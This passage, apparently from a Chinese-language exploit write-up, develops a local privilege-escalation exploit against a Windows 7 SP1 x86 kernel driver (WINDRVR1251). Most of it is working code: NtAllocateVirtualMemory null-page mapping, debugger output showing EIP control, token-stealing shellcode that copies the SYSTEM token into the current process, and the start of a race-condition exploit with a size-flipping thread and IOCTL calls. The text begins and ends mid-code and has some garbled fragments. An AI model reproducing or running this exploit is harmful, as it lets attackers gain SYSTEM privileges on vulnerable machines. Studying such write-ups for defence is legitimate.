    {
    printf(“[x] Couldn’t get handle to ntdll.dlln”);
    return FALSE;
    }
    PNtAllocateVirtualMemory AllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(hmodule, “NtAllocateVirtualMemory”);
    if (AllocateVirtualMemory == NULL)
    {
    printf(“[x] Couldn’t get address of NtAllocateVirtualMemoryn”);
    return FALSE;
    }
    SIZE_T size = 0x1000;
    PVOID address = (PVOID)0x1;
    NTSTATUS allocStatus = AllocateVirtualMemory(GetCurrentProcess(),
    &address,
    0,
    &size,
    MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
    PAGE_EXECUTE_READWRITE);
    if (allocStatus != 0)
    {
    printf(“[x] Error mapping null pagen”);
    return FALSE;
    }
    printf(“[+] Mapped null pagen”);
    return TRUE;
    }接下来，我们在偏移量0x74存储一个0x41414141值，而种种迹象表明，我们是可以控制eip的：* Symbol Path validation summary **
    Response Time (ms) Location
    Deferred SRVC:symbolshttp://msdl.microsoft.com/download/symbols
    Access violation - code c0000005 (!!! second chance !!!)
    41414141 ?? ???
既然现在我们已经可以控制代码执行了，那我们就需要想办法提升我们的权限，然后在不引起程序崩溃的情况下实现攻击。最标准的一种方法就是使用窃取令牌的Shellcode来窃取SYSTEM令牌。这里需要注意的一点是，我们必须考虑到入栈以及返回的参数数量。  
我们可以看到，在调用我们的Shellcode(ebx+0x74)之前，ObpQueryNameString向栈中推入了16字节数据：
    nt!ObpQueryNameString+0x433:
    82c60555 ff7518 push dword ptr [ebp+18h]
    82c60558 ff7514 push dword ptr [ebp+14h]
    82c6055b ff74241c push dword ptr [esp+1Ch]
    82c6055f ff7510 push dword ptr [ebp+10h]
    82c60562 ff5374 call dword ptr [ebx+74h]一开始，我们在运行完Shellcode之后一直遇到蓝屏问题，我们需要使用_declspec(naked)来声明函数才可以解决。经过精简修改后的代码如下所示：// Windows 7 SP1 x86 Offsets
    define KTHREAD_OFFSET 0x124 // nt!_KPCR.PcrbData.CurrentThread
    define EPROCESS_OFFSET 0x050 // nt!_KTHREAD.ApcState.Process
    define PID_OFFSET 0x0B4 // nt!_EPROCESS.UniqueProcessId
    define FLINK_OFFSET 0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink
    define TOKEN_OFFSET 0x0F8 // nt!_EPROCESS.Token
    define SYSTEM_PID 0x004 // SYSTEM Process PID
    /*
    The caller expects to call a cdecl function with 4 (0x10 bytes) arguments.
    */
    declspec(naked) VOID TokenStealingShellcode() {
    asm {
      ; initialize
      mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
      mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process
      mov ecx, eax; Copy current _EPROCESS structure
      mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token
      mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4
      ; begin system token search loop
      SearchSystemPID :
          mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
          sub eax, FLINK_OFFSET
          cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
          jne SearchSystemPID
      mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
      mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM to current process
      End :
          ret 0x10; cleanup for cdecl
    }
    }设置了断点之后，我们就可以了解到Shellcode在运行过程中遇到了哪些问题，我们所收集到的警告信息如下所示：Break instruction exception - code 80000003 (first chance) 00f61790 cc int 3 0: kd> kb
    ChildEBP RetAddr Args to Child
    WARNING: Frame IP not in any known module. Following frames may be wrong.
    00 b7827b88 82c60565 85407d28 857bef30 0001c34c 0xf61790
    01 b7827bdc 82c6043f bdd0fc48 c5fa0698 85407d28 nt!ObpQueryNameString+0x443
    PrivilegeCoun的值；  
下面给出的代码可以阐述整个过程：这样一来，我们就可以拿到带有SYSTEM权限的Shell了：  
完整的代码  
完整的代码我们在下面给出了，但是这里还需要注意两个问题。首先，Shellcode中的初始命令会检测所有需要运行的函数，而这里有可能会出现意外的内核模式Bug。其次，在While循环的每一次迭代过程中，我们需要重置用户模式缓冲区。
    // ConsoleApplication1.cpp : Defines the entry point for the console application.
    //
    include “stdafx.h”
    include 
    include 
    define device L”\.WINDRVR1251”
    define SPRAY_SIZE 30000
    typedef NTSTATUS(WINAPI PNtAllocateVirtualMemory)(
    HANDLE ProcessHandle,
    PVOID BaseAddress,
    ULONG ZeroBits,
    PULONG AllocationSize,
    ULONG AllocationType,
    ULONG Protect
    );
    // Windows 7 SP1 x86 Offsets
    define KTHREAD_OFFSET 0x124 // nt!_KPCR.PcrbData.CurrentThread
    define EPROCESS_OFFSET 0x050 // nt!_KTHREAD.ApcState.Process
    define PID_OFFSET 0x0B4 // nt!_EPROCESS.UniqueProcessId
    define FLINK_OFFSET 0x0B8 // nt!_EPROCESS.ActiveProcessLinks.Flink
    define TOKEN_OFFSET 0x0F8 // nt!_EPROCESS.Token
    define SYSTEM_PID 0x004 // SYSTEM Process PID
    /*
    The caller expects to call a cdecl function with 4 (0x10 bytes) arguments.
    */
    declspec(naked) VOID TokenStealingShellcode() {
    asm {
     hasRun:
           xor eax, eax; Set zero
           cmp byte ptr [eax], 1; If this is 1, we have already run this code
           jz End;
           mov byte ptr [eax], 1; Indicate that this code has been hit already
          ; initialize
          mov eax, fs:[eax + KTHREAD_OFFSET]; Get nt!_KPCR.PcrbData.CurrentThread
          mov eax, [eax + EPROCESS_OFFSET]; Get nt!_KTHREAD.ApcState.Process
          mov ecx, eax; Copy current _EPROCESS structure
          mov ebx, [eax + TOKEN_OFFSET]; Copy current nt!_EPROCESS.Token
          mov edx, SYSTEM_PID; WIN 7 SP1 SYSTEM Process PID = 0x4
          ; begin system token search loop
          SearchSystemPID :
      mov eax, [eax + FLINK_OFFSET]; Get nt!_EPROCESS.ActiveProcessLinks.Flink
          sub eax, FLINK_OFFSET
          cmp[eax + PID_OFFSET], edx; Get nt!_EPROCESS.UniqueProcessId
          jne SearchSystemPID
          mov edx, [eax + TOKEN_OFFSET]; Get SYSTEM process nt!_EPROCESS.Token
          mov[ecx + TOKEN_OFFSET], edx; Copy nt!_EPROCESS.Token of SYSTEM to current process
          End :
      ret 0x10; cleanup for cdecl
    }
    }
    BOOL map_null_page()
    {
    / Begin NULL page map /
    HMODULE hmodule = LoadLibraryA(“ntdll.dll”);
    if (hmodule == INVALID_HANDLE_VALUE)
    {
    printf(“[x] Couldn’t get handle to ntdll.dlln”);
    return FALSE;
    }
    PNtAllocateVirtualMemory AllocateVirtualMemory = (PNtAllocateVirtualMemory)GetProcAddress(hmodule, “NtAllocateVirtualMemory”);
    if (AllocateVirtualMemory == NULL)
    {
    printf(“[x] Couldn’t get address of NtAllocateVirtualMemoryn”);
    return FALSE;
    }
    SIZE_T size = 0x1000;
    PVOID address = (PVOID)0x1;
    NTSTATUS allocStatus = AllocateVirtualMemory(GetCurrentProcess(),
        &address,
        0,
        &size,
        MEM_RESERVE | MEM_COMMIT | MEM_TOP_DOWN,
        PAGE_EXECUTE_READWRITE);
    if (allocStatus != 0)
    {
        printf("[x] Error mapping null pagen");
        return FALSE;
    }
    printf("[+] Mapped null pagen");
    return TRUE;
    }
    /*
    Continually flip the size
    @Param user_size - a pointer to the user defined size
    */
    DWORD WINAPI flip_thread(LPVOID user_size)
    {
    printf(“[+] Flipping thread startedn”);
    while (TRUE)
    {
      *(ULONG *)(user_size) ^= 10; //flip between 0x52 and 0x58, giving a 0x40 byte overflow.
    }
    return 0;
    }
    DWORD WINAPI ioctl_thread(LPVOID user_buff)
    {
    char out_buff[40];
    DWORD bytes_returned;
    HANDLE hdevice = CreateFile(device,
        GENERIC_READ | GENERIC_WRITE,
        FILE_SHARE_READ | FILE_SHARE_WRITE,
        NULL,
        OPEN_EXISTING,